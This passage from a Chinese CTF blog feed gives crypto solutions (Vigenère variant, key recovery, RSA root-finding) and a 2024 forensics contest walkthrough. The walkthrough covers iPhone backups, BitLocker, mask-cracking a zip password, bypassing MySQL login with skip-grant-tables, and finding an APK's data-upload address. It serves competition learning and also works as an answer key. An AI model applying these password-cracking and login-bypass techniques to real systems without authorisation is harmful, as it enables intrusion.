key, key[::-1])# 程序运行结果（即密文为）:kY0awfsdlY1FFL8C3bi4GSYCF&#123;8W_E</code></pre><p>比较无脑 ctfwiki原题</p><p><a href="https://ctf-wiki.org/crypto/classical/summary/#_4">2017 SECCON Vigenere3d</a></p><pre><code class="python"># exp2.pyenc_str = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&#39;dec_dic = &#123;k:v for v,k in enumerate(enc_str)&#125;encrypt = &#39;kY0awfsdlY1FFL8C3bi4GSYCF&#123;8W_E&#39;flag_bg = &#39;flag&#123;**************************&#125;&#39;sim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(5)] # 破解模拟密钥sim_key = sim_key + sim_key[::-1]flag_ed = [dec_dic[v]-sim_key[k%10] for k,v in enumerate(encrypt)] # 模拟密钥解密flag_ed = &#39;&#39;.join([enc_str[i%len(enc_str)] for i in flag_ed]) # 解码print(flag_ed)# flag&#123;kynFTW2PRdH9lCZBf8IKDe6U&#125;</code></pre><h3 id="guess-the-key"><a href="#guess-the-key" class="headerlink" title="guess_the_key"></a>guess_the_key</h3><p>给了一个main.c 是加密函数的代码 给了msg01是明文 msg01.enc、msg02.enc是密文 先看加密代码</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv) &#123;    if (argc != 3) &#123;        printf(&quot;USAGE: %s INPUT OUTPUT\n&quot;, argv[0]);        return 0;    &#125;    FILE* input  = fopen(argv[1], &quot;rb&quot;);    FILE* output = fopen(argv[2], &quot;wb&quot;);    if (!input || !output) &#123;        printf(&quot;Error\n&quot;);        return 0;    &#125;    char key[] = &quot;guessthekey&quot;;    char d, q, t = 0;    int ijk = 0;    while ((q = fgetc(input)) != EOF) &#123;        d = (q + (key[ijk % strlen( key )] ^ t) + ijk*ijk) &amp; 0xff;        t = q;        ijk++;        fputc(d, output);    &#125;    return 0;&#125;</code></pre><p>其实关键的一步就是d &#x3D; (q + (key[ijk % strlen( key )] ^ t) + ijk*ijk) &amp; 0xff;</p><p>d是密文[i] q是明文[i] key是密钥[i] t在经历一次循环之后就是明文[i-1] ijk就是一个单独的参数 在每一次循环结束之后都自加1  </p><p>由此我们利用明文msg.01和msg01.enc来破解出key </p><p>在这段加密代码中 key是每一位循环使用的 但对于前几位明文(不超过key的长度)来说 key[ijk % strlen( key ) 这一部分其实就是key[i] </p><p>我们可以利用爆破的方法 利用上面这个公式反推出q[i] &#x3D; d[i] - key[i]^q[i-1] - pow(ijk, 2) </p><p>我们使用循环遍历每一位key[i]的值 当出现满足q[i] &#x3D;&#x3D; text[i] (text是已知的明文)的key[i]时 我们就将这个key输出    下面是脚本</p><pre><code class="python">ciphertext = [0x9E,0x97,0x4B,0xD2,0x9A,0x8B,0xAD,0xA1,0x89,0x09,0xDE,0xAD,0x69,0x23,0x4E,0x76,0x70,0xAB,0xE4,0x97,0x44,0x22,0x81,0x8D,0x7F,0x22,0x23,0x70,0x7F,0xB5,0xFF,0x68,0x72,0xC1,0xC2,0x4B]text = &quot;Hi,there is nothing here,heiheihei.&quot;t = 0i = 0for p in ciphertext:        for key in range(31, 125):  # 这里表示的是key的ascii值            q = (p - (key ^ t) - i*i) &amp; 0xff            q = chr(q)  # 将q的ascii值转换为字符            try:                if q == text[i]:                    print(chr(key), end=&quot;&quot;)  # 将key的ascii值转换为字符输出                    t = ord(q)               # 将q的ascii值赋予t                    i += 1                    break            except:                 print(&#39;&#39;)                    # VeryVeryLongKeyYouWillNeverKnowVery</code></pre><p>我们可以看到key出现了循环的部分 那么正确的key就是<code>VeryVeryLongKeyYouWillNeverKnow</code></p><p>有了key  我们就可以继续写脚本获得msg02</p><pre><code class="python">msg02_enc = [0xA9,0x9F,0x83,0x45,0xEE,0x87,0x9B,0x6E,0x0E,0xC3,0xD4,0xE9,0xD5,0x61,0x36,0x81,0x70,0x96,0xD4,0xD7,0xF9,0xE4,0xC9,0x8C,0xD3,0xEA,0xDE,0xAC,0x7B,0xC5,0xA9,0x84,0x97,0xCB,0xB8,0xA8,0x8A,0x95,0x54,0x6D,0xBA,0xC0,0x7B,0xA0,0x06,0x68,0x9F,0x02,0xA8,0xCD,0x2A,0x52,0x49,0x91,0xE7,0x4A,0x71,0x6B,0xA8,0x1E,0x8E,0xBB,0xDC,0xED,0x7C,0x0B,0x5C,0x04,0x74,0x6B,0xBE,0x1C,0xC1,0x59,0xBC,0xAD,0x12,0xC2,0xFB,0xDA,0xEB,0x26,0xB1,0x61,0xED,0xE0,0x5D,0xF2,0xC8,0xA3,0x27,0xC5,0x96,0x58,0xAD,0xF5,0x8D,0x54,0x05,0xBC,0x47,0xAD,0x0C,0xE9,0xC0,0xAF,0x48,0x02,0x25,0x1E,0xC9,0xAB,0x6F,0x5B,0x37,0x30,0xBD,0x3A,0xC8,0xC7,0xCD,0xA0,0x4F,0xD9,0xBC,0x72,0x7E,0x84,0x53,0xB5,0x87,0x48,0xE5,0x8D,0x92,0xA9,0xC7,0xBC,0xEE,0x13,0x01,0xE7,0x5D,0x73,0x99,0x59,0x29,0xDC,0x1A,0xEF,0xA6,0xBB,0xB6,0xFD,0x12,0x86,0x82,0x7E,0x4C,0x6F,0x84,0xBA,0xF7,0x52,0x80,0x92,0x0D,0xB0,0xD9,0x07,0x40,0xF3,0x17,0x95,0xAF,0xC9,0xBB,0xE8,0xE7,0xF1,0x08,0x75,0xF4,0xF1,0x03,0x1C,0xC3,0x11,0x36,0x49,0xAA,0x04,0x69,0xF7,0xA0,0xC5,0xCD,0x17,0xC6,0x23,0x6B,0xBE,0xE7,0x7B,0xE2,0xE6,0x4B,0xD4,0x5E,0x55,0xC3,0x0C,0x54,0xD3,0x5C,0x05,0x79,0xCE,0x1B,0xD4,0x91,0x50,0xF6,0xB4,0x36,0x41,0x46,0xD5,0x38,0xB1,0x21,0xE0,0xE2,0x38,0xA2,0x65,0xB7,0x16,0x71,0xF7,0x82,0x56,0x4D,0x22,0xE2,0x3B,0xEE,0x89,0x1E,0xA7,0xB3,0x46,0xFA,0x82,0x83,0x3D,0xB1,0x8C,0x85,0x92,0xB7,0x52,0x99,0x13,0xBA,0x72,0x43,0xDB,0x10,0xE8,0xA0,0x5B,0x39,0xDA,0xB3,0xF8,0xF8,0xE3,0xAF,0xA2,0x6A,0x29,0x2F,0x82,0x91,0x6E,0x41,0x58,0x77,0xC8,0xAD,0xA8,0x89,0xCF,0x00,0xB3,0xB6,0x27,0x5F,0xC6,0xD6,0xAF,0xB3,0x1C,0x6B,0xF1,0x25,0xB8,0x20,0xA0,0xD1,0x89,0xBA,0x04,0xF9,0xD5,0x8E,0x0B,0xB0,0x10,0x8B,0x37,0x99,0xBC,0xBA,0x05,0xB3,0x58,0xA3,0x5C,0xF4,0x86,0x43,0xEA,0x08,0x1D,0x79,0xFE,0x1B,0x05]key = &#39;VeryVeryLongKeyYouWillNeverKnow&#39;msg02 = &#39;&#39;t = 0for i in range(len(msg02_enc)):     if i ==0:        q = chr((msg02_enc[i] - (ord(key[i % len(key)]) ^ 0) - pow(i, 2)) &amp; 0xff)     else:        q = chr((msg02_enc[i] - (ord(key[i % len(key)]) ^ ord(t)) - pow(i, 2)) &amp; 0xff)     t = q     msg02 += qprint(msg02)# She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;101a6ec9f938885df0a44f20458d2eb4&#125;</code></pre><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><pre><code>p=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919</code></pre><p>上面就是我们能拿到的数据</p><p>看yolo师傅的博客学到是  有限域内开方 <a href="https://hucongting.com/2023/10/19/RSA%E4%B8%ADe%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0%E9%97%AE%E9%A2%98/">RSA中e和phi不互素问题</a></p><pre><code class="python">from Crypto.Util.number import *p=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919n = p*qP.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#39;NTL&#39;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#39;NTL&#39;)g=a^e-cmqs=g.monic().roots()flag=[]for mpp in mps:    x=mpp[0]    for mqq in mqs:        y=mqq[0]        solution = CRT_list([int(x), int(y)], [p, q])        flag.append(solution)for i in flag:    m=long_to_bytes(i)    if b&#39;flag&#39;in m:        print(m)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082248969.png" alt="image-20240208224859887"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023古剑山&quot;&gt;&lt;a href=&quot;#2023古剑山&quot; class=&quot;headerlink&quot; title=&quot;2023古剑山&quot;&gt;&lt;/a&gt;2023古剑山&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="crypto" scheme="http://w3nx1z1.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2024獬豸杯</title>
    <link href="http://w3nx1z1.github.io/2024/01/30/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/01/30/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/</id>
    <published>2024-01-29T16:15:37.932Z</published>
    <updated>2024-02-01T04:52:50.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024獬豸杯"><a href="#2024獬豸杯" class="headerlink" title="2024獬豸杯"></a>2024獬豸杯</h1><h2 id="手机备份包"><a href="#手机备份包" class="headerlink" title="手机备份包"></a>手机备份包</h2><h3 id="手机基本信息"><a href="#手机基本信息" class="headerlink" title="手机基本信息"></a>手机基本信息</h3><h4 id="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12"><a href="#1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12" class="headerlink" title="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)"></a>1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)</h4><pre><code>2024-01-15.14:19:44</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291605828.png" alt="image-20240129160542802"></p><p>文件名就是备份时间 也可以从<code>\IOS备份\2024年01月15日_14时19分44秒_iPhone\log.txt</code>里面看到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291657598.png" alt="image-20240129165751567"></p><h4 id="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）"><a href="#2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）" class="headerlink" title="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）"></a>2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）</h4><pre><code>2</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282139544.png" alt="image-20240128213900524"></p><h4 id="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）"><a href="#3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）" class="headerlink" title="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）"></a>3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）</h4><pre><code>89860320245121150689</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282139301.png" alt="image-20240128213922267"></p><h4 id="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）"><a href="#4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）" class="headerlink" title="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）"></a>4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）</h4><pre><code>20240115</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282145766.png" alt="image-20240128214539725"></p><h3 id="地图数据"><a href="#地图数据" class="headerlink" title="地图数据"></a>地图数据</h3><h4 id="5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）"><a href="#5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）" class="headerlink" title="5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）"></a>5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）</h4><pre><code>天铂华庭</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282147290.png" alt="image-20240128214759225"></p><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><h4 id="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db"><a href="#1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db" class="headerlink" title="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)"></a>1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)</h4><pre><code>Bookmarks.db</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282149182.png" alt="image-20240128214929128"></p><h4 id="2、手机机主计划去哪里旅游。（标准格式：苏州"><a href="#2、手机机主计划去哪里旅游。（标准格式：苏州" class="headerlink" title="2、手机机主计划去哪里旅游。（标准格式：苏州)"></a>2、手机机主计划去哪里旅游。（标准格式：苏州)</h4><pre><code>拉萨</code></pre><p>火眼分析不出来safari的搜索记录 可以直接从源文件翻数据库 路径为</p><pre><code>2024年01月15日_14时19分44秒_iPhone/文件系统/2024年01月15日_14时19分44秒_iPhone.tar/AppDomain-com.apple.mobilesafari/Library/Preferences/com.apple.mobilesafari.plist</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282248530.png" alt="image-20240128224856438"></p><p>或者是使用AXIOM分析苹果手机备份 可以分析出safari的搜索记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282252719.png" alt="image-20240128225254615"></p><h3 id="即时通讯"><a href="#即时通讯" class="headerlink" title="即时通讯"></a>即时通讯</h3><h4 id="1、手机机主查询过那个人的身份信息。（标准格式：龙信）"><a href="#1、手机机主查询过那个人的身份信息。（标准格式：龙信）" class="headerlink" title="1、手机机主查询过那个人的身份信息。（标准格式：龙信）"></a>1、手机机主查询过那个人的身份信息。（标准格式：龙信）</h4><pre><code>龙黑</code></pre><p>老样子从小西米语音的聊天信息数据库里面找找东西 最近这个考点已经出现很多次了 数据库默认名称为<code>im5db</code> 提取出来 在navicat里面看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291955563.png" alt="image-20240129195518516"></p><h4 id="2、请问机主共转多少费用用于数据查询。（标准格式：1000）"><a href="#2、请问机主共转多少费用用于数据查询。（标准格式：1000）" class="headerlink" title="2、请问机主共转多少费用用于数据查询。（标准格式：1000）"></a>2、请问机主共转多少费用用于数据查询。（标准格式：1000）</h4><pre><code>1100</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291956605.png" alt="image-20240129195607582"></p><h4 id="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）"><a href="#3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）" class="headerlink" title="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）"></a>3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>从苹果手机备份里面的图片里面找到一张嫌疑人查询的10个数据的截图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291958449.png" alt="image-20240129195849411"></p><p>我们通过身份证号判断性别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292000506.png" alt="image-20240129200006479"></p><p>前8个里面有4个男性 但是王也的月份是14月 所以不算 最后面两个身份证不全或者不是身份证 无法判断性别 故不做判断 所以一共有三个男性</p><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><p>直接分析计算机是分析不出来邮件的 我们需要解一下bitlocker 刚开始我是想找密钥文件来着 在计算机镜像里面有一个文件名交</p><pre><code>BitLocker 恢复密钥 60F74055-7745-439B-四位数字-FF4101D98050</code></pre><p>还去搞了半天掩码爆破 后面看到苹果手机备份里面直接找到bitlocker的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282322424.png" alt="image-20240128232249370"></p><p>直接在火眼和取证大师里面就可以解bitlocker进行分析了</p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><h4 id="1、计算机系统的安装日期是什么时候。（标准格式：20240120）"><a href="#1、计算机系统的安装日期是什么时候。（标准格式：20240120）" class="headerlink" title="1、计算机系统的安装日期是什么时候。（标准格式：20240120）"></a>1、计算机系统的安装日期是什么时候。（标准格式：20240120）</h4><pre><code>20240112</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282255635.png" alt="image-20240128225536600"></p><h3 id="系统痕迹"><a href="#系统痕迹" class="headerlink" title="系统痕迹"></a>系统痕迹</h3><h4 id="1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）"><a href="#1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）" class="headerlink" title="1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）"></a>1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）</h4><pre><code>data.zip</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282256977.png" alt="image-20240128225650910"></p><h3 id="数据库分析"><a href="#数据库分析" class="headerlink" title="数据库分析"></a>数据库分析</h3><h4 id="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12"><a href="#1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12" class="headerlink" title="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)"></a>1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)</h4><p>解开bitlocker后 我们分析邮件内容 看到<code>2042@longxin.com</code>和<code>xiaohei@longxin.com</code>的邮件记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291128216.png" alt="image-20240129112850171"></p><p>里面提到了哈希值为<code>84fa25f20046ffd2c43991d9212bba96</code>的文件 在上一题中提到的最近访问的压缩包文件<code>data.zip</code>的哈希值就是这个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291205220.png" alt="image-20240129120504177"></p><p>在邮件记录中还提到了密码是尾号为555的手机号 我们将其提取出来使用掩码爆破 很快就爆破出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291207751.png" alt="image-20240129120715680"></p><p>密码为<code>15566666555</code> 将其进行解压得到数据库文件 直接用火眼的数据库分析工具进行分析 在mysql数据库的user表中找到password_last_changed字段  就是最后一次修改密码的时间 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291720796.png" alt="image-20240129172053762"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291720743.png" alt="image-20240129172037698"></p><h4 id="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）"><a href="#2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）" class="headerlink" title="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）"></a>2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）</h4><p>这里还是不要用火眼数据库分析工具了 会不全 这里我们要恢复数据库 用这个文件夹覆盖我们本地小皮面板里面的<code>phpstudy_pro\Extensions\MySQL5.7.26\data</code>文件夹 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291819312.png" alt="image-20240129181924255"></p><p>稳妥起见 在<code>my.ini</code>中加上<code>skip-grant-tables</code>来绕过mysql登陆密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291821215.png" alt="image-20240129182124185"></p><p>在使用navicat连接本地数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291822799.png" alt="image-20240129182228758"></p><p>看到有5个数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291822440.png" alt="image-20240129182248420"></p><h4 id="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）"><a href="#3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）" class="headerlink" title="3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）"></a>3、员工编号为204200的员工总工资为多少元。（标准格式：阿拉伯数字）</h4><p>在人员数据库的salaries_list表中使用sql语句进行查询</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291835071.png" alt="image-20240129183541039"></p><pre><code> 488313</code></pre><h4 id="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）"><a href="#4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）" class="headerlink" title="4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）"></a>4、Finance部门中在1999年1月1日当天和之后入职的人员数量是多少名。（标准格式：阿拉伯数字）</h4><pre><code>1486</code></pre><p>还是使用sql语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291856806.png" alt="image-20240129185651769"></p><h3 id="邮箱服务器"><a href="#邮箱服务器" class="headerlink" title="邮箱服务器"></a>邮箱服务器</h3><p>在计算机下载应用里面找到一个<code>hMailServer</code> 这应该就是邮箱服务器了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292012799.png" alt="image-20240129201243760"></p><h4 id="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）"><a href="#1、请问邮箱服务器的登录密码是多少。（标准格式：admin）" class="headerlink" title="1、请问邮箱服务器的登录密码是多少。（标准格式：admin）"></a>1、请问邮箱服务器的登录密码是多少。（标准格式：admin）</h4><pre><code>900110</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300013406.png" alt="image-20240130001300369"></p><h4 id="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）"><a href="#2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）" class="headerlink" title="2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）"></a>2、邮件服务器中共有多少个账号。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>这里从取证软件里面看会少一个 直接在hMailServer里面找 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292351857.png" alt="image-20240129235112822"></p><h4 id="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）"><a href="#3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）" class="headerlink" title="3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）"></a>3、邮件服务器中共有多少个域名。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>登陆邮件服务器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300013359.png" alt="image-20240130001331304"></p><p>使用密码900110 打开Domains 看到三个域名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401300014031.png" alt="image-20240130001411983"></p><h4 id="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）"><a href="#4、请问约定见面的地点在哪里。（标准格式：太阳路668号）" class="headerlink" title="4、请问约定见面的地点在哪里。（标准格式：太阳路668号）"></a>4、请问约定见面的地点在哪里。（标准格式：太阳路668号）</h4><pre><code>中国路999号</code></pre><p>misc做法 在邮件记录里面找到一个附件<code>待会见.jpg</code>  直接修改图片的宽高就可以看到在图片下方有见面地址</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282328465.png" alt="image-20240128232840426"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282328916.png" alt="image-20240128232852733"></p><h2 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h2><h4 id="1、APP包名是多少。（标准格式：com-xxx-xxx）"><a href="#1、APP包名是多少。（标准格式：com-xxx-xxx）" class="headerlink" title="1、APP包名是多少。（标准格式：com.xxx.xxx）"></a>1、APP包名是多少。（标准格式：com.xxx.xxx）</h4><pre><code>com.example.readeveryday</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291921364.png" alt="image-20240129192135281"></p><h4 id="2、apk的主函数名是多少。（标准格式：comlongxin）"><a href="#2、apk的主函数名是多少。（标准格式：comlongxin）" class="headerlink" title="2、apk的主函数名是多少。（标准格式：comlongxin）"></a>2、apk的主函数名是多少。（标准格式：comlongxin）</h4><pre><code>StartShow</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291923411.png" alt="image-20240129192309348"></p><h4 id="3、apk的签名算法是什么。（标准格式：xxx）"><a href="#3、apk的签名算法是什么。（标准格式：xxx）" class="headerlink" title="3、apk的签名算法是什么。（标准格式：xxx）"></a>3、apk的签名算法是什么。（标准格式：xxx）</h4><pre><code>SHA1withRSA</code></pre><p>这个其实在雷电的分析结果里面有 是<code>SHA1-RSA</code> 但还是以jadx的分析结果为准</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291927610.png" alt="image-20240129192746538"></p><h4 id="4、apk的应用版本是多少。（标准格式：1-2）"><a href="#4、apk的应用版本是多少。（标准格式：1-2）" class="headerlink" title="4、apk的应用版本是多少。（标准格式：1.2）"></a>4、apk的应用版本是多少。（标准格式：1.2）</h4><pre><code>1.0</code></pre><h4 id="5、请判断该apk是否需要联网。（标准格式：是-x2F-否）"><a href="#5、请判断该apk是否需要联网。（标准格式：是-x2F-否）" class="headerlink" title="5、请判断该apk是否需要联网。（标准格式：是&#x2F;否）"></a>5、请判断该apk是否需要联网。（标准格式：是&#x2F;否）</h4><pre><code>是</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291928207.png" alt="image-20240129192825171"></p><h4 id="6、APK回传地址？（标准格式：127-0-0-1-12345）"><a href="#6、APK回传地址？（标准格式：127-0-0-1-12345）" class="headerlink" title="6、APK回传地址？（标准格式：127.0.0.1:12345）"></a>6、APK回传地址？（标准格式：127.0.0.1:12345）</h4><pre><code>http://10.0.102.135:8888/api/demo</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291936089.png" alt="image-20240129193638046"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291937786.png" alt="image-20240129193700747"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291937800.png" alt="image-20240129193729740"></p><p>沙箱和雷电都分析出来一个内网地址 在jadx里面翻主函数的代码 也能找到一个<code>checkAndUpload</code>函数 在里面找到同样的地址</p><h4 id="7、APK回传数据文件名称是什么。（标准格式：1-txt）"><a href="#7、APK回传数据文件名称是什么。（标准格式：1-txt）" class="headerlink" title="7、APK回传数据文件名称是什么。（标准格式：1.txt）"></a>7、APK回传数据文件名称是什么。（标准格式：1.txt）</h4><pre><code>Readdata.zip</code></pre><p>接上题 在同样的函数里面找到这个文件</p><p>也可以使用雷电抓包看回传的文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401302217534.png" alt="image-20240130221730474"></p><p>选择代理模式抓包 </p><p><img 